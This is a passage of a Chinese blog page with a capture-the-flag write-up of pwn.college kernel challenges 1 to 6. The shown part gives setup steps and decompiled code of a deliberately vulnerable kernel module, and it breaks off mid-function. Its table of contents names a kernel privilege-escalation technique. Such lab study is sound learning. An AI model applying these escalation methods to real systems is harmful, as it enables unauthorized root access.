@@ -1,0 +1,941 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-LMV367JHNS"></script>
+  <script data-pjax>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'G-LMV367JHNS');
+  </script>
+
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    HFTTC&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="前言：没有怎么接触过 KernelPWN 但是又不知道怎么学，在网上偶然发现有这么个学习内核基础利用的网站 也就十二道题目，并且利用链并不长，决定学习一下。其实也不想一上来就学习太难的东西打消自己的积极性，另外没有一个好的基础直接学攻击手法利用链什么的总觉得有点空中楼阁，经不起考验。&lt;指的我自己~~~&gt; 从一开始会非常详细，往后逐渐了解之后会着重点记录  \[^_^]\  下载 pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HFTTC&#39;s Blog">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/06/19/Pwn.college-Kernel-1-6/index.html">
+<meta property="og:site_name" content="HFTTC&#39;s Blog">
+<meta property="og:description" content="前言：没有怎么接触过 KernelPWN 但是又不知道怎么学，在网上偶然发现有这么个学习内核基础利用的网站 也就十二道题目，并且利用链并不长，决定学习一下。其实也不想一上来就学习太难的东西打消自己的积极性，另外没有一个好的基础直接学攻击手法利用链什么的总觉得有点空中楼阁，经不起考验。&lt;指的我自己~~~&gt; 从一开始会非常详细，往后逐渐了解之后会着重点记录  \[^_^]\  下载 pwn">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781162831969-77d048f5-30b6-4c2a-bcf7-5f65782bb5ce.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781163014622-551663ac-98fd-44cf-a29a-1de1438c3d85.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781163076893-c0657309-87f4-4242-9896-da990cd5a483.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781163270521-4fb8e184-fc61-446f-b2ee-af8eb9205f98.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781163962787-46c6bbcd-603c-4ca7-ace3-94f642fa81c0.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781163937351-505460d4-14fc-4a1e-8a04-8f6d39d05207.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781164184041-97946411-9466-4684-a8bb-1bf21d78c41f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781167746130-fa435ac8-976c-4537-a0e8-c6db7e9a2c08.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781164299220-0de99c03-32aa-4f26-9ce0-536b7e0ddbc3.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781166719180-15abf856-6f34-437f-bb39-1708008325eb.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781169271732-13e71a2d-4a9d-4ee4-8d28-c60be277e7ec.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781169537200-f018653a-c918-496c-8513-a5ce4765471f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781169641545-37021443-8231-4601-af33-e5749b0a7157.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781171046074-a0042e5e-e790-477b-9a05-befa710b4a94.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781171917734-11483cb2-5a64-4e4c-bc97-1027b6184ef6.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781173562050-274283a6-191e-4e6b-a17d-19b215cc413d.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781175597803-2d0eb64d-b65b-40b6-b68c-9964831ca794.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781176879854-3015ca32-8445-4369-9c77-302c44e3a1b8.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781177719766-9f9479ac-e71f-469f-b580-dc68817724aa.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781177950577-3b88f3c5-a714-4287-a360-f09fe132dd89.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781180214873-f23fbee0-bdef-451a-a575-c9b7abc100b5.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781180995554-d330c86a-3066-4a47-be6f-586729b6ed18.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781181367113-bdd2875c-f0e6-4696-acd0-b8e4ccd67a1e.png">
+<meta property="article:published_time" content="2026-06-19T13:43:37.559Z">
+<meta property="article:modified_time" content="2026-06-19T13:43:51.227Z">
+<meta property="article:author" content="HFTTC">
+<meta property="article:tag" content="Pwn, CTF, Binary">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781162831969-77d048f5-30b6-4c2a-bcf7-5f65782bb5ce.png">
+      <meta name="keywords" content="Pwn, CTF, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="HFTTC's Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/catalog">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">目录</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/HFTTC.github.io/images/banner.webp" alt="">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">HFTTC&#39;s Blog</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+              <span id="subtitle">Pwn &amp; Security</span>
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD-pwn-college-%E9%99%84%E4%BB%B6%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">下载 pwn.college 附件：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LEVEL1-%E5%AF%86%E7%A0%81%E6%A0%A1%E9%AA%8C"><span class="toc-number">2.</span> <span class="toc-text">LEVEL1_密码校验</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IDA-%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">IDA 分析程序：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#init-module-%EF%BC%9A"><span class="toc-number">2.1.1.</span> <span class="toc-text">init_module()：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#cleanup-module-%EF%BC%9A"><span class="toc-number">2.1.2.</span> <span class="toc-text">cleanup_module()：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#device-write-%EF%BC%9A"><span class="toc-number">2.1.3.</span> <span class="toc-text">device_write()：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#device-read-%EF%BC%9A"><span class="toc-number">2.1.4.</span> <span class="toc-text">device_read()：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#device-open-device-realease"><span class="toc-number">2.1.5.</span> <span class="toc-text">device_open&amp;device_realease</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">EXP 思路：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LEVEL2-%E5%86%85%E6%A0%B8%E6%97%A5%E5%BF%97"><span class="toc-number">3.</span> <span class="toc-text">LEVEL2_内核日志</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">3.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LEVEL3-%E6%8F%90%E6%9D%83%E5%87%BD%E6%95%B0"><span class="toc-number">4.</span> <span class="toc-text">LEVEL3_提权函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%A0%B8%E5%BF%83%E5%87%AD%E8%AF%81%EF%BC%9Acommit-creds-prepare-kernel-cred-0"><span class="toc-number">4.1.</span> <span class="toc-text">提权核心凭证：commit_creds(prepare_kernel_cred(0))</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-1"><span class="toc-number">4.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LEVEL4-iotcl"><span class="toc-number">5.</span> <span class="toc-text">LEVEL4_iotcl</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-2"><span class="toc-number">5.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LEVEL5-%E5%8F%82%E6%95%B0%E6%8C%87%E9%92%88%E8%B0%83%E7%94%A8"><span class="toc-number">6.</span> <span class="toc-text">LEVEL5_参数指针调用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E5%9F%BA%E5%9C%B0%E5%9D%80-Module-Base%EF%BC%89%EF%BC%9A0xffffffffc0000000"><span class="toc-number">6.1.</span> <span class="toc-text">内核模块基地址 Module_Base）：0xffffffffc0000000</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP%EF%BC%9A"><span class="toc-number">6.2.</span> <span class="toc-text">EXP：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LEVEL6"><span class="toc-number">7.</span> <span class="toc-text">LEVEL6</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%A0%B8%E5%BF%83%E5%9F%BA%E5%9C%B0%E5%9D%80%EF%BC%88Kernel-Base%EF%BC%89%EF%BC%9A0xffffffff81000000"><span class="toc-number">7.1.</span> <span class="toc-text">内核核心基地址（Kernel Base）：0xffffffff81000000</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP%EF%BC%9A-1"><span class="toc-number">7.2.</span> <span class="toc-text">EXP：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#https-xz-aliyun-com-news-14980"><span class="toc-number">8.</span> <span class="toc-text">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;news&#x2F;14980</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#title-%E2%80%98Pwn-college-Kernel-1-6%E2%80%99date-2026-06-19-21-35-57tags-pwn-kernel-pwn-collegecategories-Notes"><span class="toc-number">9.</span> <span class="toc-text">title: ‘Pwn.college-Kernel-1-6’date: 2026-06-19 21:35:57tags:  - pwn  - kernel  - pwn.collegecategories:  - Notes</span></a></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">136</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-Pwn.college-Kernel-1-6" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-06-19T13:43:37.559Z" itemprop="datePublished">2026-06-19</time>
+    <time style="display: none;" id="post-update-time">2026-06-19</time>
+  </span>
+    <span class="article-date-link icon-calendar-plus" data-aos="zoom-in">
+      <time datetime="2026-06-19T13:43:51.227Z" itemprop="dateModified">2026-06-19</time>
+    </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <p>前言：没有怎么接触过 KernelPWN 但是又不知道怎么学，在网上偶然发现有这么个学习内核基础利用的网站</p>
+<p>也就十二道题目，并且利用链并不长，决定学习一下。其实也不想一上来就学习太难的东西打消自己的积极性，另外没有一个好的基础直接学攻击手法利用链什么的总觉得有点空中楼阁，经不起考验。&lt;指的我自己~~~&gt;</p>
+<p>从一开始会非常详细，往后逐渐了解之后会着重点记录  <code>\[^_^]</code>\</p>
+<hr>
+<h3 id="下载-pwn-college-附件："><a href="#下载-pwn-college-附件：" class="headerlink" title="下载 pwn.college 附件："></a>下载 pwn.college 附件：</h3><p>pwn.college 的 kernel 基础关卡在：<a target="_blank" rel="noopener" href="https://pwn.college/system-security/kernel-security/">https://pwn.college/system-security/kernel-security/</a></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781162831969-77d048f5-30b6-4c2a-bcf7-5f65782bb5ce.png"></p>
+<p>首先在 User Setting 添加 SSH key，然后每个关卡开启之后都会给你 ssh 协议链接：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781163014622-551663ac-98fd-44cf-a29a-1de1438c3d85.png"></p>
+<p>然后复制下来在虚拟机上进行 ssh 连接即可：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781163076893-c0657309-87f4-4242-9896-da990cd5a483.png"></p>
+<p>每道题目的文件都会放在 &#x2F;chanllege&#x2F; 的目录下，直接去取即可。</p>
+<p>由于我的 IDA 不在虚拟机内，我采取的方法是将 kali_share 文件夹连通物理机和虚拟机，把文件复制出来即可：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781163270521-4fb8e184-fc61-446f-b2ee-af8eb9205f98.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp hacker@dojo.pwn.college:/challenge/babykernel_level12<span class="number">.1</span> /home/kali/Desktop/kali_share/pwn_college/</span><br><span class="line">scp hacker@dojo.pwn.college:/challenge/babykernel_level12<span class="number">.1</span>.ko /home/kali/Desktop/kali_share/pwn_college/</span><br></pre></td></tr></table></figure>
+
+<p>然后再用物理机的 IDA 打开文件即可分析。</p>
+<h3 id="LEVEL1-密码校验"><a href="#LEVEL1-密码校验" class="headerlink" title="LEVEL1_密码校验"></a>LEVEL1_密码校验</h3><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781163962787-46c6bbcd-603c-4ca7-ace3-94f642fa81c0.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781163937351-505460d4-14fc-4a1e-8a04-8f6d39d05207.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781164184041-97946411-9466-4684-a8bb-1bf21d78c41f.png"></p>
+<p>先进入到远程环境当中：抓取 flag 结果被告知 1 权限不够，我们当前处于的是用户态。</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781167746130-fa435ac8-976c-4537-a0e8-c6db7e9a2c08.png"></p>
+<h4 id="IDA-分析程序："><a href="#IDA-分析程序：" class="headerlink" title="IDA 分析程序："></a>IDA 分析程序：</h4><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781164299220-0de99c03-32aa-4f26-9ce0-536b7e0ddbc3.png"></p>
+<h5 id="init-module-："><a href="#init-module-：" class="headerlink" title="init_module()："></a>init_module()：</h5><p>init_module 是这是内核模块的入口，你要看它注册了什么。通常它会调用 <code>register_chrdev</code>（注册字符设备）或者 <code>proc_create</code>（创建 <code>/proc</code> 接口）。<strong>主要是为了</strong>找到它为用户态暴露了什么接口（设备名、proc 文件名），并记录下绑定的 <code>file_operations</code>（文件操作结构体）。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __int64 v0; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">    v0 = filp_open(<span class="string">&quot;/flag&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(flag, <span class="number">0</span>, <span class="keyword">sizeof</span>(flag));</span><br><span class="line">    kernel_read(v0, flag, <span class="number">128</span>, v0 + <span class="number">104</span>);</span><br><span class="line">    filp_close(v0, <span class="number">0</span>);</span><br><span class="line">    proc_entry = (proc_dir_entry *)proc_create(<span class="string">&quot;pwncollege&quot;</span>, <span class="number">438</span>, <span class="number">0</span>, &amp;fops);</span><br><span class="line">    printk(&amp;unk_BC1);</span><br><span class="line">    printk(&amp;unk_9C0);</span><br><span class="line">    printk(&amp;unk_BC1);</span><br><span class="line">    printk(&amp;unk_9F0);</span><br><span class="line">    printk(&amp;unk_A58);</span><br><span class="line">    printk(&amp;unk_AB8);</span><br><span class="line">    printk(&amp;unk_B08);</span><br><span class="line">    printk(&amp;unk_BC8);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>读取 Flag 到内核全局变量：</p>
+<ul>
+<li><code>filp_open(&quot;/flag&quot;, 0, 0)</code>：在内核态直接打开根目录下的 &#x2F;flag 文件。</li>
+<li><code>memset(flag, 0, sizeof(flag))</code>：清空一个名为 flag 的内核全局变量缓冲区。</li>
+<li><code>kernel_read(v0, flag, 128, ...)</code>：从 &#x2F;flag 文件中读取前 128 个字节，存入到内核全局变量 flag 中</li>
+<li><code>filp_close(v0, 0)</code>：关闭文件句柄。</li>
+</ul>
+<p>交互注册接口：</p>
+<p><code>proc_create(&quot;pwncollege&quot;, 438, 0, &amp;fops)</code>：在 &#x2F;proc 目录下创建一个名为 pwncollege 的伪文件接口</p>
+<ul>
+<li>权限 <code>438</code> 转成八进制就是 <code>0666</code>（即所有用户可读可写）。</li>
+<li>关键在于 <code>&amp;fops</code>，这是一个 <code>file_operations</code> 结构体指针。</li>
+</ul>
+<h5 id="cleanup-module-："><a href="#cleanup-module-：" class="headerlink" title="cleanup_module()："></a>cleanup_module()：</h5><ul>
+<li>模块卸载时的清理工作（如 <code>unregister_chrdev</code> 或 <code>proc_remove</code>）。</li>
+<li>粗略看一眼即可，主要检查是否有释放不彻底导致的残余，或者在卸载时是否有潜在的 UAF 漏洞。</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">cleanup_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( proc_entry )</span><br><span class="line">        proc_remove();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>if ( proc_entry )：检查在 init_module 中创建的 &#x2F;proc&#x2F;pwncollege 伪文件的入口指针是否不为 NULL</li>
+<li>proc_remove()：调用内核 API 移除这个 <code>/proc</code> 条目。这样当模块退出后，用户态就无法再通过 <code>/proc/pwncollege</code> 访问它了。</li>
+</ul>
+<h5 id="device-write-："><a href="#device-write-：" class="headerlink" title="device_write()："></a>device_write()：</h5><ul>
+<li><code>device_read</code>是内核向用户态返回数据的函数。重点看它如何使用 <code>_copy_to_user</code>。</li>
+<li>****是否允许读取未初始化的内核内存，或者没有严格限制读取长度，导致内核信息泄露，可用于绕过 KASLR</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">device_write</span><span class="params">(file *file, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> size; <span class="comment">// rdx</span></span><br><span class="line">    <span class="type">char</span> password[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+10h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">    v8 = __readgsqword(<span class="number">0x28u</span>);</span><br><span class="line">    